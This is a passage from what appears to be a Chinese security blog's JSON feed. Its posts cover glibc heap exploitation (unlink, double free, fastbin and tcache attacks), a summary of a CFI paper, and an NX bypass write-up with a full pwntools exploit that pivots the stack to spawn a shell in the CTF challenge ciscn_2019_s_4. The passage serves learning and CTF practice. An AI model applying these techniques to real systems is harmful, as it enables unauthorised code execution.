<span class=\"hljs-number\">0</span>))      \\<br>      malloc_printerr (<span class=\"hljs-string\">\"corrupted size vs. prev_size\"</span>);               \\<br>    FD = P-&gt;fd;                                                                      \\<br>    BK = P-&gt;bk;                                                                      \\<br>    <span class=\"hljs-comment\">// 此处才真正的取出FD和BK两个chunk块</span><br>    <span class=\"hljs-comment\">// 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。</span><br>    <span class=\"hljs-keyword\">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class=\"hljs-number\">0</span>))                    \\ <span class=\"hljs-comment\">// 看看取出的目标块是不是真正的目标</span><br>      malloc_printerr (check_action, <span class=\"hljs-string\">\"corrupted double-linked list\"</span>, P, AV);  \\<br>    <span class=\"hljs-keyword\">else</span> {                                                                      \\<br>        FD-&gt;bk = BK;                                                              \\<br>        BK-&gt;fd = FD;   <span class=\"hljs-comment\">// 此处主要是将P排除在外，让前后块进行连接                 \\</span><br><span class=\"hljs-comment\">        // 下面主要考虑 P 对应的 nextsize 双向链表的修改</span><br>        <span class=\"hljs-keyword\">if</span> (!in_smallbin_range (chunksize_nomask (P))                              \\<br>            <span class=\"hljs-comment\">// 如果P-&gt;fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。</span><br>            <span class=\"hljs-comment\">// 那么其实也就没有必要对 nextsize 字段进行修改了。</span><br>            <span class=\"hljs-comment\">// 这里没有去判断 bk_nextsize 字段，可能会出问题。</span><br>            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class=\"hljs-literal\">NULL</span>, <span class=\"hljs-number\">0</span>)) {                      \\<br>            <span class=\"hljs-comment\">// 类似于小的 chunk 的检查思路</span><br>            <span class=\"hljs-keyword\">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class=\"hljs-number\">0</span>)              \\<br>                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class=\"hljs-number\">0</span>))    \\<br>              malloc_printerr (check_action,                                      \\<br>                               <span class=\"hljs-string\">\"corrupted double-linked list (not small)\"</span>,    \\<br>                               P, AV);                                              \\<br>            <span class=\"hljs-comment\">// 这里说明 P 已经在 nextsize 链表中了。</span><br>            <span class=\"hljs-comment\">// 如果 FD 没有在 nextsize 链表中</span><br>            <span class=\"hljs-keyword\">if</span> (FD-&gt;fd_nextsize == <span class=\"hljs-literal\">NULL</span>) {                                      \\<br>                <span class=\"hljs-comment\">// 如果 nextsize 串起来的双链表只有 P 本身，那就直接拿走 P</span><br>                <span class=\"hljs-comment\">// 令 FD 为 nextsize 串起来的</span><br>                <span class=\"hljs-keyword\">if</span> (P-&gt;fd_nextsize == P)                                      \\<br>                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                      \\<br>                <span class=\"hljs-keyword\">else</span> {                                                              \\<br>                <span class=\"hljs-comment\">// 否则我们需要将 FD 插入到 nextsize 形成的双链表中</span><br>                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                              \\<br>                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                              \\<br>                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                              \\<br>                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                              \\<br>                  }                                                              \\<br>              } <span class=\"hljs-keyword\">else</span> {                                                              \\<br>                <span class=\"hljs-comment\">// 如果在的话，直接拿走即可</span><br>                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                      \\<br>                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                      \\<br>              }                                                                      \\<br>          }                                                                       \\<br>      }                                                                              \\<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<ul>\n<li>注意：以上操作有个Bug、就是其只是对P前后的内容进行了处理，也就是只对链进行了处理，但是并没有对P本身这个块进行任何的处理。也就是P-&gt;fd,和P-&gt;bk两个指针中还是存储着地址值的。因此可以利用这个地址进行libc地址的泄露</li>\n<li>泄露思路：<ul>\n<li>P 位于双向链表头部，bk 泄漏</li>\n<li>P 位于双向链表尾部，fd 泄漏</li>\n<li>双向链表只包含一个空闲 chunk 时，P 位于双向链表中，fd 和 bk 均可以泄漏（啥意思？双向链表的起始地址，及时libc的地址吗？？）</li>\n</ul>\n</li>\n<li>泄露堆地址<ul>\n<li>P 位于双向链表头部，fd 泄漏</li>\n<li>P 位于双向链表中，fd 和 bk 均可以泄漏</li>\n<li>P 位于双向链表尾部，bk 泄漏</li>\n</ul>\n</li>\n<li>注意：<ul>\n<li>这里的头部指的是 bin 的 fd 指向的 chunk，即双向链表中最新加入的 chunk。</li>\n<li>这里的尾部指的是 bin 的 bk 指向的 chunk，即双向链表中最先加入的 chunk。</li>\n<li><strong>堆的第一个 chunk 所记录的 prev_inuse 位默认为 1。</strong></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"init-malloc函数\"><a href=\"#init-malloc函数\" class=\"headerlink\" title=\"_init_malloc函数\"></a>_init_malloc函数</h3><p>该函数是malloc申请内存的底层函数</p>\n<ol>\n<li>它根据用户申请的<strong>内存块大小</strong>以及<strong>相应大小 chunk 通常使用的频度</strong>（fastbin chunk, small chunk, large chunk），依次实现了不同的分配方法。</li>\n<li>它由小到大依次检查不同的 bin 中是否有相应的空闲块可以满足用户请求的内存。</li>\n<li>当所有的空闲 chunk 都无法满足时，它会考虑 top chunk。</li>\n<li>当 top chunk 也无法满足时，堆分配器才会进行内存块申请。</li>\n</ol>\n<ul>\n<li>注意一点，所有的数据进入malloc之后全部都会被转化为无符号整数。</li>\n<li>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，就会考虑是不是 large bin。但是，其实在 large bin 中并没有直接去扫描对应 bin 中的 chunk，而是先利用 malloc_consolidate（参见 malloc_state 相关函数） 函数处理 fast bin 中的 chunk，将有可能能够合并的 chunk 先进行合并后放到 unsorted bin 中，不能够合并的就直接放到 unsorted bin 中，然后再在下面的大循环中进行相应的处理。<strong>为什么不直接从相应的 bin 中取出 large chunk 呢？这是 ptmalloc 的机制，它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。</strong></li>\n</ul>\n<h2 id=\"堆溢出常见攻击手段\"><a href=\"#堆溢出常见攻击手段\" class=\"headerlink\" title=\"堆溢出常见攻击手段\"></a>堆溢出常见攻击手段</h2><p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172016077.png\" alt=\"image-20230625155220102\"></p>\n<h3 id=\"堆溢出\"><a href=\"#堆溢出\" class=\"headerlink\" title=\"堆溢出\"></a>堆溢出</h3><p>​\t堆溢出的本质可以类比栈溢出的内容，堆溢出的本质是从用户缓冲区向下溢出到下一个堆块中，如果溢出长度够长，甚至能够重写下一个堆块中的内容。</p>\n<h3 id=\"double-free\"><a href=\"#double-free\" class=\"headerlink\" title=\"double free\"></a>double free</h3><p>​\tdouble free漏洞的本质是将当前对应块的指针做二次的free操作。对同一个块进行两次free操作，则该块会被加入到bin链两次，那么在后续进行多次malloc时会出现指针相同的情况。在fastibin中使用fd作为单向链表的索引链。double free的成功利用必须要满足下面过程：</p>\n<ul>\n<li>malloc(P)-&gt;free(p)-&gt;free(p)-&gt;malloc(p)-&gt;修改p中fd的内容为target address-&gt;malloc(p) </li>\n<li>最后一次返回的指针指向Target address，直接写入该堆块即可完成</li>\n<li>但是上面过程会检查是否连续两次free了同一块内存，因此需要中间加个chunk free一下。</li>\n</ul>\n<p>放入fastbin的过程会完成fastbin_ptr= p1, p1-&gt;fd = p2, p2-&gt;fd = p1</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403052212692.png\" alt=\"image-20240305221155597\"></p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403052212770.png\" alt=\"image-20240305221209726\"></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/64434547\">https://zhuanlan.zhihu.com/p/64434547</a> </p>\n<p>这里注意，fastbin使用的其实是拉链法存储的chunk，从头部开始向后放的，从fastbin指针后面插入栈。最后fastbin的指针直接指向目标地址，然后malloc的时候就会分配该地址。</p>\n<h3 id=\"unlink-1\"><a href=\"#unlink-1\" class=\"headerlink\" title=\"unlink\"></a>unlink</h3><ul>\n<li>unlink的作用是将free时，操作双向链表中相邻的两个free chunk进行合并操作。</li>\n<li>注意事项:unlink不发生在<em>fastbin和smallbin</em>中,所以fastbin和smallbin容易产生漏洞。fastbin使用单向链表进行存储</li>\n<li>unlink本身存在一些检查</li>\n</ul>\n<p>unlink首先检查当前内存空间中该块的相邻块是否空闲，并且检查当前的块大小和下一个块记录的prev_size大小是否相同，如果空闲则进行合并操作。</p>\n<p>unlink的代码中实现的操作就是将当前程序中的某个chunk从双向链表中取出来，下面的代码以当前要取出的块是p为例。</p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\">FD = p-&gt;fd;<br>BK = p-&gt;bk;<br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br><span class=\"hljs-comment\">// 其实就是传统的双向链表取元素的操作</span><br><span class=\"hljs-comment\">/*</span><br><span class=\"hljs-comment\">\t上述操作中，当前块的fd和bk是可以被伪造的。</span><br><span class=\"hljs-comment\">\t假设此刻将两个地址分别重写为got[free], 和shellcode地址</span><br><span class=\"hljs-comment\">\t执行前两条指令后。</span><br><span class=\"hljs-comment\">\tFD = got[free] - 12（32位机器）</span><br><span class=\"hljs-comment\">\tBK = shellcode  // 这里BK要加fd，所以不需要存储</span><br><span class=\"hljs-comment\">\t执行第三条指令，将got表中的地址写为shellcode地址，从而实现got表劫持</span><br><span class=\"hljs-comment\">\t但是这个方法在新版libc里没有用！！！</span><br><span class=\"hljs-comment\">*/</span><br></code></pre></td></tr></tbody></table></figure>\n\n<p>​\tunlink之前需要进行一些简单的检查，这个检查是可以欺骗的：</p>\n<p>​\tfd的偏移是3个机器位数，bk的偏移是4个机器位数。即在64位机器上，fd是8*3=24字节，bk是8*4=32字节；32位机器上，fd是4 *3 =12字节，bk是4*4=16字节。设伪空闲堆块的堆块头指针是p，那么需要检查：p-&gt;bk-&gt;fd==p &amp;&amp; p-&gt;fd-&gt;bk==p, 只需要保证满足 fd = &amp;p - 3*size(int); bk = &amp;p - 2*size(int) 即可。</p>\n<p>​\t<strong>也就是说</strong>：在新版的glibc中，使用另一种思路，依赖于一个UAF漏洞，对一个已经free的堆块进行修改。假设想要修改的内存是ptr，那么就修改这p中fd = &amp;ptr - 3*size(int); bk = &amp;ptr- 2*size(int) ，在检查的过程中BK-&gt;fd = FD-&gt;BK = ptr。 最终在执行完unlink操作后，ptr变为了ptr-0x18（其实也就是最后一条指令的作用），但是同样新版的unlink也会修改</p>\n<h4 id=\"例题-0CTF2015-freenote\"><a href=\"#例题-0CTF2015-freenote\" class=\"headerlink\" title=\"例题 0CTF2015 freenote\"></a>例题 0CTF2015 freenote</h4><p>​\t</p>\n<h3 id=\"fastbin-attack\"><a href=\"#fastbin-attack\" class=\"headerlink\" title=\"fastbin attack\"></a>fastbin attack</h3><h4 id=\"攻击原理\"><a href=\"#攻击原理\" class=\"headerlink\" title=\"攻击原理\"></a>攻击原理</h4><p>fastbin是一种简单的单向链表，用于存储大小小于等于0x80（默认情况下）的已经释放的堆块。Fastbin attack的基本原理是利用fastbin链表的机制，通过伪造堆块的头部，使得堆分配器将伪造的堆块地址返回给程序，从而控制被释放的堆块的指针。攻击者可以通过覆盖被释放的堆块的指针，实现任意地址写或者控制流劫持。</p>\n<h4 id=\"house-of-spirit\"><a href=\"#house-of-spirit\" class=\"headerlink\" title=\"house of spirit\"></a>house of spirit</h4><p><a href=\"https://www.anquanke.com/post/id/85357\">https://www.anquanke.com/post/id/85357</a></p>\n<ul>\n<li>house of sporit与double free存在相似之处，二者的区别free掉的块一个指向真正被malloc的过的内存，而另一个则是构造一个完全虚假的内存块，并且包含精心构造的chunk数据结构</li>\n<li></li>\n</ul>\n<h3 id=\"tcache-attack\"><a href=\"#tcache-attack\" class=\"headerlink\" title=\"tcache attack\"></a>tcache attack</h3><p>tcache本身是单向链表，并且一个线程对应一个tcache存在。</p>\n<p><a href=\"https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.14_glibc_tcache.html#ctf-%E5%AE%9E%E4%BE%8B\">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.14_glibc_tcache.html#ctf-%E5%AE%9E%E4%BE%8B</a></p>\n<p><a href=\"https://v1ckydxp.github.io/2019/06/30/Tcache-%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/\">https://v1ckydxp.github.io/2019/06/30/Tcache-%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/</a></p>\n<h2 id=\"堆利用例题\"><a href=\"#堆利用例题\" class=\"headerlink\" title=\"堆利用例题\"></a>堆利用例题</h2><p><a href=\"https://www.freebuf.com/articles/system/171261.html\">https://www.freebuf.com/articles/system/171261.html</a></p>\n<h3 id=\"fastbin-dup-into-stack\"><a href=\"#fastbin-dup-into-stack\" class=\"headerlink\" title=\"fastbin_dup_into_stack\"></a>fastbin_dup_into_stack</h3>",
            "tags": [
                "HEAP PWN CTF"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/05/05/bypass-aslr/",
            "url": "https://alazymechnaic.github.io/2023/05/05/bypass-aslr/",
            "title": "BYPASS-ASLR",
            "date_published": "2023-05-05T02:29:48.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2023/05/02/kong-zhi-liu-wan-zheng-xing-cfi/",
            "url": "https://alazymechnaic.github.io/2023/05/02/kong-zhi-liu-wan-zheng-xing-cfi/",
            "title": "控制流完整性（CFI）",
            "date_published": "2023-05-02T10:21:39.000Z",
            "content_html": "<h2 id=\"Finding-Cracks-in-Shields-On-the-Security-of-Control-Flow-Integrity-Mechanisms\"><a href=\"#Finding-Cracks-in-Shields-On-the-Security-of-Control-Flow-Integrity-Mechanisms\" class=\"headerlink\" title=\"Finding Cracks in Shields:On the Security of Control Flow Integrity Mechanisms\"></a>Finding Cracks in Shields:On the Security of Control Flow Integrity Mechanisms</h2><hr>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048279.png\" alt=\"image-20230502185448539\"></p>\n<p>​\t最早的CFI机制在2005年被提出，后续又出现了各种各样的CFI，但是有一点就是这些机制都不能给予程序绝对的控制流安全性。通常的做法是给ICT（indirect control transfer）指令施加监视器，一个ICT可能存在多个合法的跳转目标，但是在每次执行的时候只能跳转到一个确定的位置。（因此最理想的情况就是每条跳转指令只能有一个确定的跳转位置）</p>\n<p>​\t当前的任何CFI控制流安全策略都需要解决以下几个问题：</p>\n<ul>\n<li>如何让claimed boundary和real boundary match？</li>\n<li>有些可行的目标组合依然会导致漏洞利用（这不就是DOP么？）</li>\n</ul>\n<p>然后这个文章后面讲了评估CFI方案好坏的方法，等用到的时候再看</p>\n",
            "tags": [
                "程序分析"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/05/02/bypass-nx/",
            "url": "https://alazymechnaic.github.io/2023/05/02/bypass-nx/",
            "title": "BYPASS-NX",
            "date_published": "2023-05-02T06:56:58.000Z",
            "content_html": "<h2 id=\"Bypass-NX（DEP）\"><a href=\"#Bypass-NX（DEP）\" class=\"headerlink\" title=\"Bypass NX（DEP）\"></a>Bypass NX（DEP）</h2><h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h3><p>​\t栈不可执行（NX），其实也称为DEP(Data Execution PreventionData Execution Prevention),用于防止在栈上执行代码，当该保护开启时，会触发程序的<strong>SIGSEGV</strong> 错误。这里需要注意的一点为，开启该选项后，不只是栈段，数据段（堆段）依然处于不可执行的状态。</p>\n<h3 id=\"绕过\"><a href=\"#绕过\" class=\"headerlink\" title=\"绕过\"></a>绕过</h3><p>​\t既然无法将shellcode注入到数据段上并执行，那就只能修改IP指向已有的代码部分。例如采用技术 Return-to-libc,修改当前的EIP指针向已有的库函数，并且传递相应的参数。（<strong>如果在开启了NX的情况下如何进行单字节溢出的利用</strong>）。</p>\n<p><strong>least privilege &amp; seteuid(getuid())</strong></p>\n<p>​\t在实际的应用程序中会采用最小特权原则，并且能够进行权限继承，因此，攻击者能够获取与当前程序相同权限的shell，但在程序中可以通过setuid的方式主动放弃不必要的权限。因此，如果想要获得更高权限的shell需要构造以下调用序列：</p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\">seteuid(<span class=\"hljs-number\">0</span>)<br>system(“sh”)<br><span class=\"hljs-built_in\">exit</span>()<br></code></pre></td></tr></tbody></table></figure>\n\n<p>但是存在问题，setuid的参数是\\x00，但是strcpy在遇到\\x00后会自动停止，并不能将其拷贝到栈中。因此需要使用到两个技术：</p>\n<ul>\n<li>ESP lifting (ESP抬升)</li>\n<li>Frame Faking(栈帧伪造)</li>\n<li><a href=\"https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/\">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</a></li>\n</ul>\n<p>其实二者是一个东西，本质是和之前的单字节溢出，利用leave | ret指令实现栈抬升相同，主要使用leave和ret两个指令：</p>\n<figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">leave:<br>        move esp,ebp ; 恢复栈顶指针<br>        pop ebp ;(esp=esp+4)<br></code></pre></td></tr></tbody></table></figure>\n\n<p>栈迁移的本质是重新构造出进入jmp system_got 时的栈情况，最终目的是将esp迁移过来。但是需要注意的一点是，一次leave ret指令智能将esp抬升上去，并不能对ebp做任何操作，因此需要进行两次leave ret指令，第一个ret不能返回到system而是找到gadget：</p>\n<figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">esp,ebp --&gt; old_ebp<br>        --&gt; ret_addr<br>        --&gt; arg1 :此处是指向system字符串参数的指针<br><br></code></pre></td></tr></tbody></table></figure>\n\n<hr>\n<h3 id=\"例题-ciscn-2019-s-4\"><a href=\"#例题-ciscn-2019-s-4\" class=\"headerlink\" title=\"例题 ciscn_2019_s_4\"></a>例题 ciscn_2019_s_4</h3><p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048537.png\" alt=\"image-20230504193243253\"></p>\n<p>题目很简单，buff的长度有40，但是read函数长度有48，多出八个字节能够溢出。总体思路是进行rop，但是由于溢出长度有限，在vul函数退出后进行了清理堆栈的操作，导致后面的内容不可控，因此需要进行栈迁移，将更多的栈部分可控。</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202305042048754.png\" alt=\"image-20230504193612815\"></p>\n<p>在32位程序下，栈按照四个字节进行对齐，因此溢出的八个字节能够覆盖ebp指针和ret地址。一个函数在执行leave | ret之前的状态如下：</p>\n<figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">esp -&gt; [???] ; 此时的esp指针可能会指向栈中的任意位置<br>...<br>ebp -&gt; [old_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此<br>\t   [ret_add] ; 记录当前的返回地址<br></code></pre></td></tr></tbody></table></figure>\n\n<p>上述经过栈溢出后，old_ebp和ret_addr被覆盖为new_ebp, new_ret_addr,在执行leave ret指令后的栈空间：</p>\n<figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">inst: <br>\tmov esp,ebp<br>----------------------------------------------<br>ebp,esp -&gt; [new_ebp] ; 这里是记录父函数的栈基址，由刚进子函数的时候push ebp指令存储至此<br>\t   [new_ret_addr] ; 记录当前的返回地址<br>----------------------------------------------<br>inst: <br>\tpop ebp<br>----------------------------------------------<br>ebp = buff_(new_ebp) ; 指向新的栈位置,这里位置的构造进行后续讨论<br>esp -&gt; [new_ret_addr] ; 记录当前的返回地址<br></code></pre></td></tr></tbody></table></figure>\n\n<p>但是注意此时还并没有完全将栈迁移出去。此时的esp还在低位，如果直接将new_ret_addr覆盖为system，则此时索引的arg参数是esp + 0x4（因为在执行过call函数后，压入了call system的下一个地址），比esp地址更高的位置显然是不可控的（注意这里，栈是向低地址增长的，新函数的参数由父函数压入，因此在高地址）。需要将esp进行同样的抬升。因此需要再次执行leave ret指令继续修改。</p>\n<figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">inst: <br>\tmov esp,ebp<br>----------------------------------------------<br>ebp,esp = buff_ ; 执行结束后完成将esp的抬升<br>----------------------------------------------<br>inst: <br>\tpop ebp<br>----------------------------------------------<br>esp = buff_ ;  <br>ebp = Any ;   pop ebp执行后会改变ebp，但是对后续的利用来说，ebp指向哪里并没有影响,因为子函数只基于esp进行索引<br></code></pre></td></tr></tbody></table></figure>\n\n<p>所以该题目的思路也逐渐清晰，就是要通过溢出将esp抬升。抬升前需要指导buff的地址，也就是esp应该抬升到哪里去，本题还需要用到的部分是<strong>printf</strong>本身在输出的时候接收一个字符串指针，并自动执行到\\x00的位置结束。因此可以利用该机制进行ebp的泄露。</p>\n<figure class=\"highlight python\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br>sh = process(<span class=\"hljs-string\">'./ciscn_s_4'</span>)<br>elf=ELF(<span class=\"hljs-string\">'./ciscn_s_4'</span>)<br>context(os = <span class=\"hljs-string\">'linux'</span>,arch = <span class=\"hljs-string\">'amd64'</span>,log_level = <span class=\"hljs-string\">'debug'</span>)<br><span class=\"hljs-string\">'''</span><br><span class=\"hljs-string\">\t静态查找leave ret指令地址</span><br><span class=\"hljs-string\">'''</span><br>system_addr = <span class=\"hljs-number\">0x8048400</span><br>leave_ret_addr=<span class=\"hljs-number\">0x080484B8</span><br>ret_addr = p32(system_addr)<br><span class=\"hljs-string\">'''</span><br><span class=\"hljs-string\">\t第一次直接构造和buff长度相同的输入，printf时会输出后续内容</span><br><span class=\"hljs-string\">'''</span><br>payload =<span class=\"hljs-string\">b'a'</span> * <span class=\"hljs-number\">0x28</span><br>sh.recvuntil(<span class=\"hljs-string\">'name?\\n'</span>)<br>sh.send(payload)<br><span class=\"hljs-string\">'''</span><br><span class=\"hljs-string\">\t接收泄露的ebp输出</span><br><span class=\"hljs-string\">'''</span><br>sh.recvuntil(<span class=\"hljs-string\">'a'</span>*<span class=\"hljs-number\">0x28</span>)<br>ebp = u32(sh.recv(<span class=\"hljs-number\">4</span>).ljust(<span class=\"hljs-number\">4</span>,<span class=\"hljs-string\">b'\\x00'</span>))<br><span class=\"hljs-string\">'''</span><br><span class=\"hljs-string\">\t这里泄露出ebp后只能做基于ebp的偏移，将ebp偏移到buff的位置。当程序的控制流的确定时，其栈帧的相对位置也是确定的，因此可以直接在动态调试的过程中获取ebp和buff的位置，直接相减得到偏移量为0x38</span><br><span class=\"hljs-string\">'''</span><br>fake_ebp = ebp -<span class=\"hljs-number\">0x38</span><br><span class=\"hljs-string\">'''</span><br><span class=\"hljs-string\">\t构造第二次输入的payload</span><br><span class=\"hljs-string\">'''</span><br>payload=p32(system_addr) <span class=\"hljs-comment\"># ret addr</span><br>payload+=<span class=\"hljs-string\">b'aaaa'</span> <span class=\"hljs-comment\"># junk ret addr 用于模拟call system时的压入返回值操作</span><br>payload+=p32(fake_ebp+<span class=\"hljs-number\">12</span>) <span class=\"hljs-comment\"># 指向system参数的指针，这里注意，system传入的不是一个字符串而是一个指针</span><br>payload+=<span class=\"hljs-string\">b'/bin/sh\\x00'</span> <span class=\"hljs-comment\"># payload</span><br>payload=payload.ljust(<span class=\"hljs-number\">0x28</span>,<span class=\"hljs-string\">b'A'</span>) <span class=\"hljs-comment\"># 这里对当前的栈进行补齐操作</span><br>payload+=p32(fake_ebp-<span class=\"hljs-number\">4</span>) <span class=\"hljs-comment\"># 该位置会作为新的栈顶更高的位置，在执行第二次leave ret指令时会进行一次pop ebp</span><br>payload+=p32(leave_ret_addr) <span class=\"hljs-comment\"># 填入leave ret返回值</span><br>sh.send(payload)<br>sh.interactive()<br>exit()<br></code></pre></td></tr></tbody></table></figure>\n\n<p>注意两个关键位置：</p>\n<p><strong>payload+=p32(fake_ebp+12) # 指向system参数的指针，这里注意，system传入的不是一个字符串而是一个指针</strong></p>\n<p><strong>payload+=p32(fake_ebp-4) # 该位置会作为新的栈顶更高的位置，在执行第二次leave ret指令时会进行一次pop ebp</strong></p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><p><a href=\"https://blog.csdn.net/sea_time/article/details/106142971\">https://blog.csdn.net/sea_time/article/details/106142971</a></p>\n<p><a href=\"https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/\">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</a></p>\n",
            "tags": [
                "bypass"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/04/27/dan-zi-jie-yi-chu-one-byte-overflow/",
            "url": "https://alazymechnaic.github.io/2023/04/27/dan-zi-jie-yi-chu-one-byte-overflow/",
            "title": "单字节溢出（one-byte-overflow）",
            "date_published": "2023-04-27T11:40:42.000Z",
            "content_html": "<h2 id=\"off-By-One-缓冲区溢出\"><a href=\"#off-By-One-缓冲区溢出\" class=\"headerlink\" title=\"off-By-One 缓冲区溢出\"></a>off-By-One 缓冲区溢出</h2><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>​\t本文用于填补先前对于二进制漏洞一些理解上的不足，学习off-by-one的漏洞利用方式。<strong>缓冲区溢出的终极目的在于获取目标机器的权限，但是获取权限未必只要一种方式，你可以添加用户，反弹shell、开启一个新的网络链接等</strong>。主要参考：<a href=\"https://sploitfun.wordpress.com/2015/06/07/off-by-one-vulnerability-stack-based-2/\">https://sploitfun.wordpress.com/2015/06/07/off-by-one-vulnerability-stack-based-2/</a></p>\n<h3 id=\"单字节溢出案例\"><a href=\"#单字节溢出案例\" class=\"headerlink\" title=\"单字节溢出案例\"></a>单字节溢出案例</h3><figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span 